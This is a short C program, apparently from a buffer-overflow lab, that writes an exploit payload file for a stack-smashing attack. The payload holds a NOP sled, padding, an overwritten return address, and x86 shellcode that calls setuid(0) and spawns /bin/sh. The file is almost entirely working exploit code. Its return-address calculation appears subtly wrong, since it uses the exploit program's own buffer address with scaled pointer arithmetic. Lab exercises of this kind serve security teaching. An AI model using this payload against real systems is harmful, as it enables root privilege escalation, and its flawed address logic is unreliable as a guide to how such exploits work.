//The goal of this code is to create contents of the malicious file. This is a partial code. You need to complete it. 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
	"\x31\xdb"
            "\x8d\x43\x17"
            "\x99"
            "\xcd\x80"
            "\x31\xc9"
            "\x51"
            "\x68\x6e\x2f\x73\x68"
            "\x68\x2f\x2f\x62\x69"
            "\x8d\x41\x0b"
            "\x89\xe3"
            "\xcd\x80";

void main(int argc, char **argv)
{
	char buffer[517];
	FILE * malfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	
	memset(&buffer, 0x90, 517);
	memset(&buffer, 0x41, 76);
	
	/* You need to fill the buffer with appropriate contents here */
	memcpy(&buffer[517-sizeof(code)],code,sizeof(code));

	long malAddress=(long *)&buffer + 100;
	long* returnPTR=(long *)(buffer + 76);
	*returnPTR=malAddress;

	/* Save the contents to the file "MalFile" */
	malfile = fopen("./malfile", "w");
	fwrite(buffer, 517, 1, malfile);
	fclose(malfile);
}
